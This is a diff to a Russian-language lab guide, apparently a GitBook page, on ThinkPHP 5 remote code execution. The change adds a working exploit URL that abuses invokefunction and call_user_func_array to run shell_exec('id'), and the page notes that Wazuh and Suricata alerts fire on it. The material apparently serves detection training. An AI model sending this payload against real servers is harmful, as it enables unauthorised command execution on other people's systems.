@@ -28,8 +28,11 @@ http://ваш-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call
 
 <figure><img src="../../.gitbook/assets/thinkphp-5-rce(2).png" alt=""><figcaption></figcaption></figure>
 
-Также вы можете выполнять произвольные команды на целевой машине вплоть до получения обратной оболочки уязвимой машины:
+Также вы можете выполнять произвольные команды на целевой машине, например команду "id":
+```
+http://ваш-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id
 
+```
 <figure><img src="../../.gitbook/assets/thinkphp-5-rce(3).png" alt=""><figcaption></figcaption></figure>
 
 В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости.
